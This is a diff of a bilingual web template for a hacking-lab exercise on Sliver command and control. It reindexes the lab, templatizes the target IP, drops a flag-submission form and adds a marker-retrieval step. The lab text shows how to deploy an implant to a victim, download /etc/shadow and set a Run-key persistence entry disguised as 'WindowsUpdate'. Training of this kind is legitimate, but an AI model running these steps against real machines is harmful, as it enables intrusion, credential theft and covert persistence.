@@ -1,5 +1,5 @@
 {% extends "base.html" %}
-{% block title %}H06 – Command & Control: Sliver – HackLabs{% endblock %}
+{% block title %}H12 – Command & Control: Sliver – HackLabs{% endblock %}
 {% block content %}
 <div class="p-6 max-w-3xl mx-auto">
   {% include '_lab_header.html' %}
@@ -27,7 +27,7 @@
 
     <div class="mt-4 hl-code text-xs">
       <div class="text-gray-400"># Conexión SSH al objetivo (ejemplo)</div>
-      <div>ssh admin@TARGET_IP</div>
+      <div>ssh admin@{{ target_ip }}</div>
       <div class="mt-2 text-gray-400"># Nota: usa las credenciales del lab o las descubiertas por bruteforce</div>
     </div>
   </div>
@@ -40,44 +40,6 @@
       <li>Transferir y ejecutar el implant en la víctima.</li>
       <li>Interactuar con la sesión Sliver, enumerar y escalar privilegios básicos.</li>
     </ul>
-  </div>
-
-  <div class="hl-card border-l-4" style="border-left-color:var(--hl-primary)">
-    <div class="text-xs uppercase tracking-wider mb-2" style="color:var(--hl-primary)">Validar Flag</div>
-    {% if is_progress_user %}
-    <div class="flex gap-2 items-end flex-wrap">
-      <div class="flex-1 min-w-[220px]">
-        <input id="lab-flag-input" type="text" placeholder="HL{...}"
-               value="{{ current_lab_validated_flag | e }}"
-               class="hl-input font-mono text-xs"
-               {% if current_lab_id in completed_lab_ids %}disabled{% endif %}>
-      </div>
-      <button id="lab-complete-btn" onclick="submitLabFlag('{{ current_lab_id }}')"
-              class="lab-complete-btn h-[34px] {% if current_lab_id in completed_lab_ids %}lab-complete-btn--done{% endif %}"
-              title="{% if current_lab_id in completed_lab_ids %}Desmarcar lab como completado{% else %}Validar flag del laboratorio{% endif %}">
-        <i class="ph {% if current_lab_id in completed_lab_ids %}ph-arrow-counter-clockwise{% else %}ph-flag-checkered{% endif %} text-sm"></i>
-        <span>{% if current_lab_id in completed_lab_ids %}Desmarcar{% else %}Validar flag{% endif %}</span>
-      </button>
-    </div>
-    {% else %}
-    <div class="flex gap-2 items-end flex-wrap">
-      <div class="flex-1 min-w-[220px]">
-        <input id="lab-flag-input" type="text" placeholder="HL{...}"
-               class="hl-input font-mono text-xs"
-               disabled>
-      </div>
-      <button id="lab-complete-btn" type="button"
-              class="lab-complete-btn h-[34px] lab-complete-btn--disabled"
-              title="Inicia sesión para validar flags"
-              disabled>
-        <i class="ph ph-lock-simple text-sm"></i>
-        <span>Enviar flag</span>
-      </button>
-    </div>
-    <a href="/account/login?next={{ request.path }}" class="text-xs mt-2 inline-block hover:opacity-80" style="color:var(--hl-primary)">
-      Inicia sesión para validar y guardar progreso
-    </a>
-    {% endif %}
   </div>
 
 </div>
@@ -107,7 +69,7 @@ sliver > jobs        # verifica que el job esté activo</code></pre>
       </li>
       <li><strong>Transferir el implant</strong> a la víctima y ejecutarlo (ejemplos):
         <pre><code class="language-bash"># Desde Kali: scp/powershell/curl según plataforma
-        scp /home/kali/IMPLANT_NAME admin@10.9.13.63:/tmp/
+        scp /home/kali/IMPLANT_NAME admin@{{ target_ip }}:/tmp/
         # En la víctima Linux/Mac:
         chmod +x /tmp/IMPLANT_NAME
         /tmp/IMPLANT_NAME
@@ -128,6 +90,9 @@ sliver (SESSION) > help</code></pre>
           <li>Descargar archivos importantes: <code>download /etc/shadow /home/kali/shadow</code> (requiere privilegios)</li>
           <li>Ejecutar comandos remotos: <code>execute -o uname -a</code></li>
         </ul>
+      </li>
+      <li><strong>Recuperar el marcador del lab</strong> desde la sesión C2:
+        <pre><code class="language-bash">sliver (SESSION) > execute -o cat /opt/hacklabs/c2/session-marker.txt</code></pre>
       </li>
       <li><strong>Persistencia básica</strong> (Windows example):
         <pre><code class="language-bash">sliver (SESSION) > execute -o cmd -Command "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d \"C:\\Users\\Public\\IMPLANT_NAME.exe\" /f"</code></pre>
@@ -200,7 +165,7 @@ sliver > jobs        # check that the job is active</code></pre>
       </li>
       <li><strong>Transfer the implant</strong> to the victim and execute it (examples):
         <pre><code class="language-bash"># From Kali: scp/powershell/curl depending on platform
-        scp /home/kali/IMPLANT_NAME admin@10.9.13.63:/tmp/
+        scp /home/kali/IMPLANT_NAME admin@{{ target_ip }}:/tmp/
         # On victim Linux/Mac:
         chmod +x /tmp/IMPLANT_NAME
         /tmp/IMPLANT_NAME
@@ -221,6 +186,9 @@ sliver (SESSION) > help</code></pre>
           <li>Download important files: <code>download /etc/shadow /home/kali/shadow</code> (requires privileges)</li>
           <li>Run remote commands: <code>execute -o uname -a</code></li>
         </ul>
+      </li>
+      <li><strong>Recover the lab marker</strong> from the C2 session:
+        <pre><code class="language-bash">sliver (SESSION) > execute -o cat /opt/hacklabs/c2/session-marker.txt</code></pre>
       </li>
       <li><strong>Basic persistence</strong> (Windows example):
         <pre><code class="language-bash">sliver (SESSION) > execute -o cmd -Command "reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v WindowsUpdate /t REG_SZ /d \"C:\\Users\\Public\\IMPLANT_NAME.exe\" /f"</code></pre>
